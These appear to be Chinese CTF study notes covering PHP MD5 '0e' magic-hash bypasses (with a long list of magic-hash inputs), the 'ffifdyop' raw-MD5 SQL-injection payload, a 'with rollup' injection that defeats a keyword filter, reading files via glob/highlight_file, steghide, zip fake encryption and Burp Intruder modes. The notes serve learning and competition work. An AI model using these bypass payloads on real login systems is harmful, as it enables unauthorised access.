## web



#### PHP MD5 0e绕过

```php
$passwd = $_post['password'];
$sql = "select password from users where username=admin";
$result = mysqli_query($conn, $sql);
$passwdhash = mysqli_fetch_assoc($result)['password'];
if (md5($passwd) == $passwdhash)
	echo "flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
```

- 这种比较方式不安全，如果`md5($passwd)`和`$passwdhash`都是以0e开头且后面均为数字的字符串，则PHP会将二者作为数字比较，因为0e12表示0乘10的12次方，所以二者均为0，结果为TRUE。

```
# 常见的md5以0e开头且后续均为数字的字符串
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
240610708 
0e462097431906509019562988736854
314282422 
0e990995504821699494520356953734
571579406 
0e972379832854295224118025748221
903251147 
0e174510503823932942361353209384
1110242161 
0e435874558488625891324861198103
1320830526 
0e912095958985483346995414060832
1586264293 
0e622743671155995737639662718498
2302756269 
0e250566888497473798724426794462
2427435592 
0e067696952328669732475498472343
2653531602 
0e877487522341544758028810610885
3293867441 
0e471001201303602543921144570260
3295421201 
0e703870333002232681239618856220
3465814713 
0e258631645650999664521705537122
3524854780 
0e507419062489887827087815735195
3908336290 
0e807624498959190415881248245271
4011627063 
0e485805687034439905938362701775
4775635065 
0e998212089946640967599450361168
4790555361 
0e643442214660994430134492464512
5432453531 
0e512318699085881630861890526097
5579679820 
0e877622011730221803461740184915
5585393579 
0e664357355382305805992765337023
6376552501 
0e165886706997482187870215578015
7124129977 
0e500007361044747804682122060876
7197546197 
0e915188576072469101457315675502
7656486157 
0e451569119711843337267091732412
QLTHNDT 
0e405967825401955372549139051580
QNKCDZO 
0e830400451993494058024219903391
EEIZDOI 
0e782601363539291779881938479162
TUFEPMC 
0e839407194569345277863905212547
UTIPEZQ 
0e382098788231234954670291303879
UYXFLOI 
0e552539585246568817348686838809
IHKFRNS 
0e256160682445802696926137988570
PJNPDWY 
0e291529052894702774557631701704
ABJIHVY 
0e755264355178451322893275696586
DQWRASX 
0e742373665639232907775599582643
DYAXWCA 
0e424759758842488633464374063001
GEGHBXL 
0e248776895502908863709684713578
GGHMVOE 
0e362766013028313274586933780773
GZECLQZ 
0e537612333747236407713628225676
NWWKITQ 
0e763082070976038347657360817689
NOOPCJF 
0e818888003657176127862245791911
MAUXXQC 
0e478478466848439040434801845361
MMHUWUV 
0e701732711630150438129209816536
```

#### PHP MD5(srt,true)漏洞

- 部分字符串的MD5值转变为二进制后，PHP会自动将二进制转为一些不可见或特殊的字符串

  ```php
  $sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
  ```

- 当`$password`为`129581926211651571912466741651878684928`或`ffifdyop`时，`md5($password,true)`的结果分别为`�T0D��o#��'or'8`和`'or'6�]��!r,��b`，这样就可以构造闭合从而绕过密码验证。

#### SQL注入 with rollup

- 当后端将大部分关键词过滤，并使用用户输入和查询到的内容进行比较的时候可用with rollup的方式让查询到的结果多一行内容。

  ```php
  function replaceSpecialChar($strParam){
      $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
      return preg_replace($regex,"",$strParam);
  }
  
  if(strlen($username)!=strlen(replaceSpecialChar($username)))
      die("sql inject error");
  
  if(strlen($password)!=strlen(replaceSpecialChar($password)))
      die("sql inject error");
  
  $sql="select * from user where username = '$username'";
  $result=mysqli_query($con,$sql);
  if(mysqli_num_rows($result)>0){
      while($row=mysqli_fetch_assoc($result)){
          if($password==$row['password']){
              echo "登陆成功<br>";
              echo $flag;
          }
  
      }
  }
  ```

- 例如user表数据如下

  ```
  +----------+----------+
  | username | password |
  +----------+----------+
  | admin    | dfdsfsd  |
  +----------+----------+
  ```

- 使用`select * from user where username = 'admin' or 1=1 group by password with rollup`得到如下结果

  ```
  +----------+----------+
  | username | password |
  +----------+----------+
  | admin    | dfdsfsd  |
  | admin    | NULL     |
  +----------+----------+
  ```

- 即在查询到的结果中再添加一行password为空的数据，然而实际数据表中并没有新增数据。

#### PHP glob highlight_file函数

- php环境配置中禁用了和系统命令相关的函数，如system\shell_exec\exec等，可以使用`print_r`\\`glob`\\`highlight_file`这些函数查看文件
- glob函数
  - glob() 函数返回一个包含匹配指定模式的文件名或目录的数组。
  - `glob("*")`返回调用该函数的php文件的相同目录下的所有文件名和文件夹
- print_r
  - `print_r`函数可以打印出数组和对象，而echo\print则只能打印字符串
  - `print_r(glob("../*"))`返回上级目录中的所有文件和文件夹

- highlight_file
  - `highlight_file`函数将指定的文件高亮显示输出，使用该函数不会将php文件执行，可以看到源代码
  - `highlight_file(conn.php)`高亮输出数据库连接文件内容




## Misc

#### steghide图像隐写

- Steghide 是一个可以将文件隐写到图片或者音频的工具

- jpg图片有很大的几率是steghide，因为steghide常见格式就是jpg

- 使用

  ```shell
  steghide extract -sf shanghao.jpg -p qsnctf
  #extract 这是操作模式，表示要从一个载体文件中提取隐藏的信息
  #-sf  指定一个包含隐藏信息的载体文件
  #test.jpg  图片名称
  #-p 密码参数，指定密码，不是密码字典
  ```

- 题目常伴随考察wireshark使用，通过导出HTTP或者FTP等对象获得隐写的图片

#### 批量搜索flag

- 题目给大量图片，flag以二进制形式写在某个图片中

- python查找

  ```python
  import os
  import re
  pwd = os.getcwd()
  _list = os.listdir(pwd)
  os.path.join(pwd, 'dict.txt')
  f = open('dict.txt', 'w')
  for file in _list:
      if '.py' in file or  '.txt' in file:
          continue
      with open(file, 'rb') as f1:
          content = f1.read()
          if b'qsnctf{' in content:
              f.write(f'{file}\n')
              flag_file = file
  f.close()
  
  with open(flag_file, 'rb') as f:
          content = f.read()
          match = re.search(rb'qsnctf\{.*?\}', content)  # 使用正则表达式匹配
          if match:
              flag = match.group().decode('utf-8')
              print(f'Flag found: {flag}')
  ```


#### 伪加密压缩

- 任何密码都无法解开压缩包时可能是伪加密压缩，这种压缩包形式主要为zip

- 通过修改文件头加密标识位、目录中的文件头加密标识这两处，使得文件被打开时会被识别为加密压缩包

- 同样的，将标识位改为无加密的状态可以解伪加密压缩包，但是不能解真正加密的压缩包

- 以zip压缩文件为例，以下是zip压缩文件的标识符解释
  - 压缩文件数据区：
    
      >  50 4B 03 04：文件头标记
      >
      >  14 00：解压文件所需 pkware 版本
      >
      >   **00 00：全局方式位标记（判断有无加密）**
      >
      >   08 00：压缩方式
      >
      >   5A 7E：最后修改文件时间
      >
      >   F7 46：最后修改文件日期


  - 压缩文件目录区：
    
    >  50 4B 01 02：目录中文件文件头标记
    >
    >  1F 00：压缩使用的 pkware 版本
    >
    >  14 00：解压文件所需 pkware 版本
    >
    >  **00 00：全局方式位标记（是否加密）**
    >
    >  08 00：压缩方式
    >
    >  5A 7E：最后修改文件时间
    >
    >  F7 46：最后修改文件日期

- 加密标识位为 00 00是无加密，01 00是有加密，改过来就好了。

- 使用ZipCenOP工具

   ```
   java -jar ZipCenOp.jar <option> <file>
   option:
   r : recover a PKZip
   e : do a fake encryption
   ```

   


## 其他

#### burp suite爆破模式

- Sniper：单个参数爆破，如果此模式下存在多个占位符，则只同时爆破一个占位符，其他占位符保持不变，例如：`{"key": "§value§", "key2": "§value2§"}`，此时爆破时会先爆破value，而`§value2§`则保持不变，发送的包为：`{"key": "爆破值", "key2": "value2"}`

- Battering ram：多个参数同时使用一个字典爆破，例如：`{"key": "§value§", "key2": "§value2§"}`，此时爆破时会先同时爆破value和value2，发送的包为：`{"key": "爆破值", "key2": "爆破值"}`

- Pitchfork：多个参数同时爆破，使用不同字典，字典间一一对应，行数不一致时则取最小值。例如：`{"key": "§value§", "key2": "§value2§"}`，使用的第一个字典为`1,2`，第二个字典为`3,4`，则发送的包为：`{"key": "1", "key2": "3"}`，`{"key": "2", "key2": "4"}`

- Cluster bomb：多个参数同时爆破，使用不同字典，字典间做笛卡尔乘积模式。例如：`{"key": "§value§", "key2": "§value2§"}`，使用的第一个字典为`1,2`，第二个字典为`3,4`，则发送的包为：`{"key": "1", "key2": "3"}`，`{"key": "1", "key2": "4"}`，`{"key": "2", "key2": "3"}`，`{"key": "2", "key2": "4"}`



